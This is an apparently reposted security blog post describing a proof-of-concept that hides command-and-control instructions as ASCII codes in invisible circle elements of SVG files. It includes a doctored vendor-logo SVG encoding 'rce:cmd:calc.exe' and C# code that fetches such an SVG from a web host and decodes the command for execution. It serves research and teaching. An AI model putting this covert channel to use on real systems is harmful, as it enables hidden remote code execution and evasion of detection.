# :mag: Hiding in Plain Sight: Steganography, C2, and SVG Files

> **Original Source:** [Hiding in Plain Sight: Steganography, C2, and SVG Files](https://infosecwriteups.com/hiding-in-plain-sight-steganography-c2-and-svg-files-567df7ceea20)
> **Platform:** infosecwriteups.com | **Category:** `FORENSICS`

---

# Hiding in Plain Sight: Steganography, C2, and SVG Files


## Using basic steganography to hide C2 commands in SVG files


## Background


### Context


Steganography is the art of hiding a message within another message or medium. Unlike encryption, which aims to hide the contents of a message, the primary objective of steganography is to conceal the existence of the message itself.


In this post, I will explore the concept of hiding messages in Scalable Vector Graphics (SVG) files and present a simple proof-of-concept (PoC) C2 connector for my c2Pac framework.


*NOTE: Steganography is an expansive topic, and this post does not attempt to cover it in depth. This post presents a concept with a PoC implementation.*


### Why SVG Files?


(1) The specification offers a wide range of options for encoding data, limited only by creativity. For example:


- The data could be encoded using various element properties.

- The order of elements can be translated into a command string.

- The absence of elements could be used to infer commands.

- Least significant byte manipulation using floating point parameters.


(2) The XML format makes it relatively easy to parse and update compared to the binary format used by other image formats.


“Compared to classic bitmapped image formats such as [JPEG](https://developer.mozilla.org/en-US/docs/Glossary/JPEG) or [PNG](https://developer.mozilla.org/en-US/docs/Glossary/PNG), SVG-format vector images can be rendered at any size without loss of quality and can be easily localized by updating the text within them, without the need of a graphical editor to do so. With proper libraries, SVG files can even be localized on-the-fly.”


Source: [https://developer.mozilla.org/en-US/docs/Web/SVG](https://developer.mozilla.org/en-US/docs/Web/SVG)


(3) Lastly, but certainly not least, SVG files are commonly found on websites, and HTTP/HTTPS is a common C2 channel that provides a means to retrieve these files.

## SVG Fundamentals


### SVG Background


SVG is a web specification for graphics. It uses an XML-based file format that describes an image, much like HTML describes a web page. In HTML, the markup is interpreted by your browser to render the elements that compose the web page. With SVG content, the data is parsed in a similar manner, resulting in an image.


Enterprises commonly use the SVG file format to ensure that branding is consistently scaled across devices and in printed formats.

### SVG Specification


“SVG drawings and images are created using a wide array of elements which are dedicated to the construction, drawing, and layout of vector images and diagrams. Here you’ll find reference documentation for each of the SVG elements.”


[https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element)


The official specification is maintained by the World Wide Web Consortium (W3C) [https://www.w3.org/](https://www.w3.org/)


The specification: [https://www.w3.org/TR/SVG2/](https://www.w3.org/TR/SVG2/)


Example of some SVG elements (not an exhaustive list):


- Basic Shapes: rect, circle, ellipse, line, polygon, polyline

- Path: coordinates to follow to draw a line

- Text: text content to render and attributes like size, orientation, color, etc.

### SVG Example


Below is an example SVG file containing a single black circle. The properties instruct the viewer on how to render the shape:


- cx = The x-axis coordinate of the center of the circle.

- cy = The y-axis coordinate of the center of the circle.

- r = The radius of the circle.


```
<svg version="1.1"
width="300" height="200"
xmlns="http://www.w3.org/2000/svg">
<circle cx="50" cy="50" r="50" />
</svg>
```


*a simple circle represented by the code above*


These are only some of the basic geometry properties for a circle element, and they are not the only properties available.

## Approach


### The Data


What does the data that we’re trying to transfer look like? Our C2 framework has a defined command format. It expects to receive a string that consists of three substrings that are separated by a single character delimiter.


Format: module:task:options


Example: rce:cmd:calc.exe


The most straightforward approach would be to send the plaintext command data within an SVG Text element. *That isn’t very sneaky*. We could easily encrypt or encode the Text element and prevent it from being displayed to users, but let’s take things a step further…

### Encoding Our Commands


We’ll use the properties of SVG elements to represent our data using ASCII character codes. The geometry properties are a natural fit for ASCII character codes.


Let’s use the circle as our control element for this PoC.


## Get Tom O'Neill’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Earlier, we noted that circles have three geometric properties associated with the element:


- cx = The x-axis coordinate of the center of the circle.

- cy = The y-axis coordinate of the center of the circle.

- r = The radius of the circle.


Let’s use these properties to store our ASCII character bytes.


Our command string (rce:cmd:calc.exe) is longer than three characters, so we’ll have to spread the characters across *multiple control elements*. The following code determines the number of control elements required to represent the command string.


```
string c2command = "rce:cmd:calc.exe";
int commandLength = c2command.Length;
int elementsNeeded = commandLength / 3;
int additionalElementsNeeded = commandLength % 3;
int totalElementsNeeded = 0;
if(additionalElementsNeeded > 0) {
totalElementsNeeded = elementsNeeded + 1;
} else {
totalElementsNeeded = elementsNeeded;
}
```


## Implementation


### C2 SVG File


The following SVG file uses the Path element to draw a chef’s hat. Imagine this is the logo for a known and trusted third-party vendor, *and their website has been compromised*.

*Chef Hat from svgrepo.com*


This image is represented in SVG format using the following XML


```
<?xml version="1.0" ?><!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
<svg fill="#000000" width="800px" height="800px" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" id="Layer_1" data-name="Layer 1"><path d="M6.33,18.45v8.59c0,.41,.34,.75,.75,.75h15.13c.41,0,.75-.34,.75-.75v-8.6c1.91-.75,3.27-2.6,3.27-4.77,0-2.83-2.3-5.13-5.13-5.13-.56,0-1.13,.1-1.67,.28-1.2-1.87-3.24-3.01-5.49-3.01s-4.09,1.02-5.31,2.75c-3.06-.27-5.56,2.14-5.56,5.11,0,2.17,1.36,4.02,3.27,4.77Zm1.5,7.84v-1.87h13.63v1.87H7.83Zm13.63-7.48v4.11H7.83v-4.11h13.63ZM8.19,10.05c.18,0,.36,.02,.56,.05,0,0,.01,0,.02,0,1.72,.33,2.97,1.83,2.97,3.57,0,.41,.34,.75,.75,.75s.75-.34,.75-.75c0-2.05-1.23-3.85-3.04-4.67,.94-1.07,2.29-1.7,3.74-1.7,1.91,0,3.64,1.07,4.5,2.79,.09,.18,.25,.31,.43,.38,.19,.06,.39,.05,.57-.04,.52-.26,1.09-.4,1.65-.4,2,0,3.63,1.63,3.63,3.63s-1.63,3.63-3.63,3.63H8.19c-2,0-3.63-1.63-3.63-3.63s1.63-3.63,3.63-3.63Z"/></svg>
```


[https://www.svgrepo.com/svg/533813/hat-chef](https://www.svgrepo.com/svg/533813/hat-chef)


We can add C2 elements with the visibility set to false, which wouldn’t be noticeable by anyone viewing it but would be available to our parser.


For example, adding 7 invisible circles to our SVG file allows us to generate an SVG with an RCE command embedded without impacting the viewable image.


```
<?xml version="1.0" ?><!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
<svg fill="#000000" width="800px" height="800px" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" id="Layer_1" data-name="Layer 1">
<path d="M6.33,18.45v8.59c0,.41,.34,.75,.75,.75h15.13c.41,0,.75-.34,.75-.75v-8.6c1.91-.75,3.27-2.6,3.27-4.77,0-2.83-2.3-5.13-5.13-5.13-.56,0-1.13,.1-1.67,.28-1.2-1.87-3.24-3.01-5.49-3.01s-4.09,1.02-5.31,2.75c-3.06-.27-5.56,2.14-5.56,5.11,0,2.17,1.36,4.02,3.27,4.77Zm1.5,7.84v-1.87h13.63v1.87H7.83Zm13.63-7.48v4.11H7.83v-4.11h13.63ZM8.19,10.05c.18,0,.36,.02,.56,.05,0,0,.01,0,.02,0,1.72,.33,2.97,1.83,2.97,3.57,0,.41,.34,.75,.75,.75s.75-.34,.75-.75c0-2.05-1.23-3.85-3.04-4.67,.94-1.07,2.29-1.7,3.74-1.7,1.91,0,3.64,1.07,4.5,2.79,.09,.18,.25,.31,.43,.38,.19,.06,.39,.05,.57-.04,.52-.26,1.09-.4,1.65-.4,2,0,3.63,1.63,3.63,3.63s-1.63,3.63-3.63,3.63H8.19c-2,0-3.63-1.63-3.63-3.63s1.63-3.63,3.63-3.63Z"/>
<circle cx="114" cy="99" r="101" visibility="hidden"/>
<circle cx="58" cy="99" r="109" visibility="hidden"/>
<circle cx="100" cy="58" visibility="hidden"/>
<circle cy="110" r="111" visibility="hidden"/>
<circle cx="116" cy="101" r="112" visibility="hidden"/>
<circle cx="97" cy="100" r="46" visibility="hidden"/>
<circle cx="101" cy="120" r="101" visibility="hidden"/>
</svg>
```


### C2 SVG File Generator


One benefit of this approach and format is that malicious content can be generated manually.


While it is possible to construct the encoded commands manually, we prefer to write code and avoid mistakes that could easily be made when editing things by hand.


I wrote a simple SVG generator that takes a C2 command and encodes it across multiple circle elements.


[https://github.com/toneillcodes/StegSVGGenerator](https://github.com/toneillcodes/StegSVGGenerator)

### C2 SVG Parser


Used the HTTP GET connector to grab the file from a website and passed the output to the SVG method, which in turn returned the command to the parsing and execution methods.


```
// this is where we swap out the C2 channel
public static async Task<string> RetrieveCommand()
{
// SVG example
string c2svg = await RetrieveCommandFromHTTPGet("http://example.com/28436691523b3a3/dontbesuspicious.svg");
string command = RetrieveFromSVG(c2svg);

// return the command for parsing and execution
return command;
}
```


Parse the XML document and configure the namespace that will be used in the XPath search.


```
public static string RetrieveFromSVG(string svgString)
{
XmlDocument doc = new XmlDocument();
try
{
doc.LoadXml(svgString);

// create an XmlNamespaceManager
XmlNamespaceManager nsmgr = new XmlNamespaceManager(doc.NameTable);

// add the SVG namespace with a prefix (e.g., "svg")
// the first argument is the prefix you'll use in your XPath.
// the second argument is the actual SVG namespace URI.
nsmgr.AddNamespace("svg", "http://www.w3.org/2000/svg");
```


Select all control nodes using the configured XPath string.


```
// use the prefix in your XPath expression
// now, we're looking for control elements that belong to the 'svg' namespace.
XmlNodeList codedNodes = doc.SelectNodes(nodeXPath, nsmgr);
```


Iterate through the control elements, checking for cx, cy, and r properties.


The GetAttribute function returns these values as a string, so we will convert them to integers and then convert the integers back to characters. As characters are processed, they are appended to a string buffer.


```
foreach (XmlNode codeNode in codedNodes)
{
if (codeNode != null)
{
// cast to XmlElement for easier access to attributes
XmlElement codeElement = codeNode as XmlElement;
if (codeElement != null)
{
if (codeElement.HasAttribute("cx"))
{
//Console.WriteLine($" cx: {codeElement.GetAttribute("cx")}");
int characterCode1 = int.Parse(codeElement.GetAttribute("cx"));
char character1 = (char)characterCode1;
//Console.Write(character1);
sb.Append(character1);
}

if (codeElement.HasAttribute("cy"))
{
//Console.WriteLine($" cy: {codeElement.GetAttribute("cy")}");
int characterCode2 = int.Parse(codeElement.GetAttribute("cy"));
char character2 = (char)characterCode2;
//Console.Write(character2);
sb.Append(character2);
}

if (codeElement.HasAttribute("r"))
{
//Console.WriteLine($" r: {codeElement.GetAttribute("r")}");
int characterCode3 = int.Parse(codeElement.GetAttribute("r"));
char character3 = (char)characterCode3;
//Console.Write(character3);
sb.Append(character3);
}
}
}
}
return sb.ToString();
```


## Proof-of-Concept


### Generating SVG Files


Using the [StegSVGGenerator project](https://github.com/toneillcodes/StegSVGGenerator), generate a PoC SVG that invokes the ‘rce’ module to run the ‘calc.exe’ command.


*SVG output with ‘rce:cmd:calc.exe’ encoded*

### Running the Agent


The agent uses the HTTP connector to retrieve an SVG that has ‘rce:cmd:calc.exe’ encoded into it. The expected result is the execution of the calculator application, as shown below.


*c2Pac SVG agent running calc.exe*

## Tools Used


### StegSVGGenerator


### c2Pac


## Alternative Approach


Another approach to encoding the data is Least Significant Bit (LSB) manipulation. Since the SVG format allows for the use of float data types for properties, it is possible to utilize an LSB algorithm to encode data into properties. This is a standard method for image steganography, as it allows us to embed data without visibly affecting the resulting image. This is a well-known approach that is covered in several posts and tools.

## References


[https://developer.mozilla.org/en-US/docs/Web/SVG](https://developer.mozilla.org/en-US/docs/Web/SVG)


[https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element)


[https://www.w3.org/](https://www.w3.org/)


[https://www.w3.org/TR/SVG2/](https://www.w3.org/TR/SVG2/)


[https://www.svgrepo.com/svg/533813/hat-chef](https://www.svgrepo.com/svg/533813/hat-chef)

---

*Originally published on [Medium](https://infosecwriteups.com/hiding-in-plain-sight-steganography-c2-and-svg-files-567df7ceea20). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of forensics CTF writeups.*
